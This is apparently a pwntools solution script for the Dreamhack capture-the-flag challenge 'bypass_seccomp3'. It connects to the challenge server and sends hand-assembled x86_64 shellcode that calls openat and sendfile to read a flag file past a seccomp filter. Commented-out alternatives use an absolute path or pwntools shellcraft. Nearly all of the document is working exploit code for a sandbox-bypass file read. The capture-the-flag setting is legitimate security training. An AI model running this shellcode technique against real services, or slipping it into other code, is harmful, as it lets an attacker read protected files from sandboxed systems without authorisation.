from pwn import *
context.arch = "x86_64"
p = remote("host1.dreamhack.games", 17827)
# p = process("./bypass_seccomp3")

#openat(int dirfd, char* path, int flags) O_READONLY: 0
#sendfile(int out_fd, int in_fd, offset, size)
#dirfd: -100 -> At File Descriptor Current Working Dir
#mov rcx, 0x67616c662f2e ; ./flag
payload = '''
mov rax, 0x101
mov rdi, -100
xor rcx, rcx
mov rcx, 0x67616c662f2e
push rcx
mov rsi, rsp
xor rdx, rdx
syscall

mov rdi, 1
mov rsi, rax
xor rdx, rdx
mov r10, 0xff
mov rax, 0x28
syscall
'''

# payload = '''
# mov rax, 0x101
# xor rdi, rdi
# lea rsi, [rip+path]
# xor rdx, rdx
# syscall

# mov rdi, 1
# mov rsi, rax
# xor rdx, rdx
# mov r10, 0xff
# mov rax, 0x28
# syscall

# path: .asciz "/home/bypass_seccomp/flag"
# '''

# payload = shellcraft.openat(0, "/home/bypass_seccomp/flag")
# payload += shellcraft.sendfile(1, 'rax', 0, 0xff) 
# payload += shellcraft.exit(0) 
p.sendline(asm(payload))
p.interactive()